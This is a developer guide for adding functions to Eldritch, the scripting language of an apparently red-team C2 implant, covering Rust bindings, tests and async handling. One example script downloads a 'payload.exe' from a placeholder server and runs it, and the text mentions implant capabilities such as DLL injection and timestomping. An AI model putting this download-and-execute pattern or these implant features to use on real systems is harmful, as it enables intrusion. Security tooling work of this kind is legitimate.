---
title: Eldritch
tags:
 - Dev Guide
description: Want to implement new functionality in the agent? Start here!
permalink: dev-guide/eldritch
---

## Overview

Eldritch is a Pythonic DSL for Red Team engagements. Eldritch is intended to provide the building-block functionality that operators need, and then operators will compose the provided functionality using Tomes. Creating a function that is too specific could limit it's usefulness to other users.

**For example**: if you want to download a file to a specific location, execute it, and return the functions result this should be chunked into separate `download`, and `execute` functions within Eldritch. The example use case should look like:

The Eldritch tome could look like this:

```python
http.download("http://fileserver.net/payload.exe", "C:/temp/")
sys.exec("C:/temp/payload.exe")
```

_Exceptions to the rule above exist if performing the activities requires the performance of rust._
_Eg. port scanning could be implemented using a for loop and `tcp_connect` however due to the performance demand of port scanning a direct implementation in rust makes more sense_

Want to contribute to Eldritch but aren't sure what to build check our ["good first issue" tickets.](https://github.com/spellshift/realm/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22)

## Create an Eldritch Function

---

### Update Documentation

`docs/_docs/user-guide/eldritch.md`
Add your function to the docs. Give your function a unique and descriptive name. Assign it to an Eldritch Library.

Currently Eldritch has the following libraries your function can be bound to:

* `assets`: Is used to interact with files stored natively in the agent.
* `crypto` Is used to encrypt/decrypt or hash data.
* `file`: Is used for any on disk file processing.
* `http`: Is used for any web requests needed to be made.
* `pivot`: Is used to migrate to identify, and migrate between systems. The pivot library is also responsible for facilitating connectivity within an environment.
* `process`: Is used to manage running processes on a system.
* `regex`: Is used to preform regex operations on strings.
* `report`: Is used to report structured data to the caller of the eldritch environment (e.g. to the c2).
* `sys`: Is used to check system specific configurations and start new processes.
* `time`: Is used for obtaining and formatting time or adding delays into code.

If your function does not fall under a specific standard library reach out to the core developers about adding a new library or finding the right fit.

Specify the input and output according to the [Starlark types spec.](https://docs.rs/starlark/0.6.0/starlark/values/index.html)
If there are OS or edge case specific behaviors make sure to document them here. If there are limitations (e.g. if a function doesn't use file streaming) specify that it can't be used for large files.

Please add your function in alphabetical order this makes it easy to search by key words.

```markdown
### library.function
library.function(arg1: str, arg2: int, arg3: list) -> bool

The <b>library.function</b> describe your function and edge cases.
```

#### Add Library Binding

A `Library Binding` is what enables you to bind rust code to a library that is exposed to the eldritch runtime. For example, the `Library Binding` for the `file.append()` eldritch method is created in [`src/file/mod.rs`](https://github.com/spellshift/realm/blob/main/implants/lib/eldritch/src/file/mod.rs) and implemented in [`src/file/append_impl.rs`](https://github.com/spellshift/realm/blob/main/implants/lib/eldritch/src/file/append_impl.rs). A Library Binding translates starlark types (e.g. [`UnpackValue`](https://docs.rs/starlark/latest/starlark/values/trait.UnpackValue.html)) to rust types where needed. Many common rust types (e.g. `String`) already implement `UnpackValue`, and so they can be directly forwarded to your rust implementation. The goal of a `Library Binding` is to enable the rust implementation to be as starlark-agnostic as possible.

To create a new `Library Binding`, add a new nested function in `implants/lib/eldritch/src/<library>/mod.rs`, where `<library>` is the name of the library you selected above (e.g. `file`). Your function should be nested in the `fn methods(builder: &mut MethodsBuilder)` block, which will automatically register it on the selected library (via the `#[starlark_module]` proc_macro). For example, adding an `append()` implementation in the `methods()` of `src/file/mod.rs` will expose a new function to eldritch, callable via `file.append(args..)`.

##### Example Library Binding

Below is a code example for creating a new library binding for the method `function`, which has a rust implementation `function_impl::function()`.

```rust
// eldritch/src/<library>/mod.rs
//...
// A module where the rust implementation of your function will live (sorted alphabetically)
mod function_impl;
mod other_function_impl;

// A few imports used in this example
use starlark::{
    environment::MethodsBuilder,
    values::{list::UnpackList, none::NoneType},
};

//...
#[starlark_module]
fn methods(builder: &mut MethodsBuilder) {
    //...

    // This Library Binding is what eldritch calls when it evaluates `your_library.function()`
    // It will attempt to unpack any arguments based on the signature defined here.
    // Additional requirements for your function and it's args can be enforced using the `#[starlark(...)]`` proc_macro.
    #[allow(unused_variables)]
    fn function(this: &YourLibrary, arg1: String, arg2: u8, arg3: UnpackList<String>) -> anyhow::Result<String> {

        // Vec does not implement UnpackValue, but the starlark evaluator provides an UnpackList to wrap Vec.
        // Here, our Library Binding accepts an UnpackList from the evaluator, but passes a Vec to our underlying
        // rust implementation.
        function_impl::function(arg1, arg2, arg3.items)
    }

    // If your function does not return a value, return a NoneType instead
    #[allow(unused_variables)]
    fn other_function(this: &YourLibrary) -> anyhow::Result<NoneType> {
        other_function_impl::other_function()?;
        Ok(NoneType{})
    }
```

#### Create Rust Implementation

Now that we've setup a `Library Binding`, most of the eldritch/starlark specific code is out of the way. All that's left is to implement a rust function that we want to expose to eldritch. First, create a new rust module at `implants/lib/eldritch/src/<library>/<function>_impl.rs` where `<library>` is the name of the library you have created a binding for and `<function>` is the name of the bound function you wish to expose to eldritch. This file will contain your rust implementation, any associated helper functions / types, and unit tests for your function.

##### Example Rust Implementation

```rust
// eldritch/src/<library>/function_impl.rs
use anyhow::Result;

fn helper(argz: String) -> bool {
    // Do helper stuff
}

pub fn function(path: arg1: String, arg2: u8, arg3: Vec<String>) -> anyhow::Result<bool> {
    // Do code stuff
    Ok(true)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_function_basic() -> anyhow::Result<()>{
        // Setup
        // Run code
        // Check results
        assert_eq!(res, true)
    }

    #[test]
    fn test_function_negative() -> anyhow::Result<()>{
        // Setup
        // Run code
        // Check that expected failures occur
        assert_eq!(res, false)
    }

    #[test]
    fn test_function_helper() -> anyhow::Result<()>{
        // Setup
        // Run helper code
        // Check results
        assert_eq!(res, true)
    }

    // More tests! 🚀
}
```

#### Update `eldritch/mod.rs` tests

Lastly, you'll need to add your new function to the `eldritch/runtime.rs` integration test. These tests assert that a predefined list of functions are available for each library. Add your function to it's respective `Library Binding` in alphabetical order.

```rust
    // Binding for the "file" library functions
    file_bindings: TestCase {
        tome: Tome {
            eldritch: String::from("print(dir(file))"),
            parameters: HashMap::new(),
            file_names: Vec::new(),
        },
        // Add the name of your function to this list, in alphabetical order
        want_output: String::from(r#"["append", "compress", "copy", "exists", "find", "follow", "is_dir", "is_file", "list", "mkdir", "moveto", "read", "remove", "replace", "replace_all", "template", "timestomp", "write"]"#),
        want_error: None,
    }
```

#### Implementation tips

* When working with files & network connections, use streaming to avoid memory issues with large files.
* If your function depends on resources outside of eldritch (Eg. files, network, etc.) implement helper function that allow the user to proactively test for errors. For example, if your function requires a specific file type, ensure a function such as `is_file` or `is_link` is also exposed to eldritch.

### Testing

Testing can be really daunting especially with complex system functions required by security professionals.
If you have any questions or hit any road blocks please reach out we'd love to help, also feel free to open a draft PR with what you have and mark it with the `help wanted` tag.
Testing isn't meant to be a barrier to contributing but instead a safety net so you know your code doesn't affect other systems. If it becomes a blocker please reach out so we can help 🙂

#### How to Test

1. Test must be cross-platform.
2. Test basic functionality.
3. Test negative cases.
4. Prevent regression.
5. Test edge cases.

**Tips**
Any methods added to the Eldritch Standard Library should have tests collocated in the method's `<function>_impl.rs` file. Here are a few things to keep in mind:

* Tests should be cross platform
  * Rely on [NamedTempFile](https://docs.rs/tempfile/1.1.1/tempfile/struct.NamedTempFile.html) for temporary files
  * Rely on [path.join](https://doc.rust-lang.org/stable/std/path/struct.Path.html) to construct OS-agnostic paths
* Chunk out implementation code into discrete helper functions so each can be tested individually.

## Additional Notes

### OS Specific functions

---
Limit changes to the implementation file.

OS specific restrictions should be done in the **Eldritch Implementation** you should only have to worry about it in your: `function_impl.rs`.
This ensures that all functions are exposed in every version of the Eldritch language.
To prevent errors and compiler warnings use the `#[cfg(target_os = "windows")]` conditional compiler flag to suppress OS specific code.
For all non supported OSes return an error with a message explaining which OSes are supported.
**Example**

```rust
    #[cfg(not(target_os = "windows"))]
    return Err(anyhow::anyhow!("This OS isn't supported by the dll_inject function.\nOnly windows systems are supported"));
```

### Using `Dict`

---
The `Dict` type requires dynamic memory allocation in starlark. In order to achieve this we can leverage the `starlark::Heap` and push entries onto it. It's pretty simple to implement and starlark does some magic to streamline the process. To make the heap available to your function simply add it as an argument to your function.

#### Example `Dict` function declarations

`implants/lib/eldritch/src/sys/mod.rs`

```rust
    fn function<'v>(this: SysLibrary, starlark_heap: &'v Heap, arg1: String, arg2: u8, arg3: UnpackList<String>) -> anyhow::Result<Dict<'v>> {
```

`implants/lib/eldritch/src/sys/function_impl.rs`

```rust
pub fn function(starlark_heap: &Heap, arg1: String, arg2: u8, arg3: UnpackList<String>) -> Result<Dict> {
```

#### Split starlark boilerplate and function implementation

One note is when working with starlark `Dict` types it preferred that a `handle_` function be implemented which returns a real data type and that data type is translated from the rust data type to starlark `Dict` in the `function` for example:

```rust
struct OsInfo {
    arch:           String,
}

fn handle_get_os() -> Result<OsInfo> {
    return Ok(OsInfo {
        arch:           whoami::arch().to_string(),
    });
}

pub fn get_os(starlark_heap: &Heap) -> Result<Dict> {

    let cmd_res = handle_get_os()?;

    let res = SmallMap::new();
    let mut dict_res = Dict::new(res);
    let arch_value = starlark_heap.alloc_str(&cmd_res.arch);
    dict_res.insert_hashed(const_frozen_string!("arch").to_value().get_hashed().unwrap(), arch_value.to_value());
    Ok(dict_res)
}
```

Splitting the code to handle inserting data into the `Dict` helps keep the code organized and also allows others looking to eldritch as an example of how things can be implemented to more clearly delineate where the technique stops and the eldritch boilerplate begins.

### Using `Async`

---
When writing performant code bound by many I/O operations, it can be greatly beneficial to use `async` methods and a scheduler, to enable CPU bound operations to be performed while awaiting I/O. This can dramatically reduce latency for many applications. Using `async` for your eldritch function implementations can be difficult however, as our underlying `starlark` dependency does not yet have great `async` support. It can be done, but it will add complexity to your code and must be implemented carefully. **YOU SHOULD NOT** implement `async` functions without having a complete understanding of how eldritch manages threads and it's own async runtime. Doing so will likely result in bugs, where you attempt to create a new `tokio::Runtime` within an existing runtime. By default, the `eldritch::Runtime` creates a new blocking thread (`tokio::task::spawn_blocking`), which helps prevent it from blocking other tome evaluation. Any results reported via the `report` library will already be concurrent with the thread that started the eldritch evaluation. **ALL ELDRITCH CODE IS SYNCHRONOUS** which means that creating an `async` function will not enable tome developers to run code in parallel, it just may allow the `tokio` scheduler to allocate CPU away from your code while it awaits an I/O operation. The primary performance benefits of using `async` is for the environment from which eldritch is being run, it is unlikely to impact the performance of any individual Tome (due to their synchronous nature).

#### Async Testing

You'll need to write tests for your synchronous and asynchronous code.
Async tests will usually start two threads one for your function and one that mocks (or reimplements) the feature you're testing against.
For example if testing a port scanner or netcat like function you'll want to run a test port listener for your feature to connect to.
Network ports test servers have been implemented in `pivot.ncat` and `pivot.port_scan` an example SSH server has been implemented in `pivot.ssh_exec`.

Tests for async functions may look like this:

```rust
// Command implementation code.
// ....

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::task;

    // Example of how to run two functions concurrently.
    // This can be useful in for testing something like a tcp connect function
    // where a test listener needs to be running too.
    #[tokio::test]
    async fn test_function_async_basic() -> anyhow::Result<()> {
        let expected_response_1 = String::from("Hello world!");
        let expected_response_2 = String::from("Good bye!");

        let task1_handler = task::spawn(
            setup_task()
        );

        let task2_handler = task::spawn(
            handle_function(["Good", "bye!"])
        );

        let (task1_handler_res, task2_handler_res) = tokio::join!(task1_handler,task2_handler);

        assert_eq!(expected_response_1, task1_handler_res.unwrap());
        assert_eq!(expected_response_2, task2_handler_res.unwrap());
    }

    // Make sure to test the synchronous handler for the test too.
    // This makes sure that our Eldritch implementation correctly passes
    // the function call from synchronous space to asynchronous space.
    #[test]
    fn test_function_not_async() -> anyhow::Result<()> {
        //Mostly just testing that the code runs.
        //Without an async setup function our code will likely return a fail state.
        //If that's the case test for that state.
        let response = function(["Test", "123"])?;
        assert_eq!(response, false);
    }
}
```
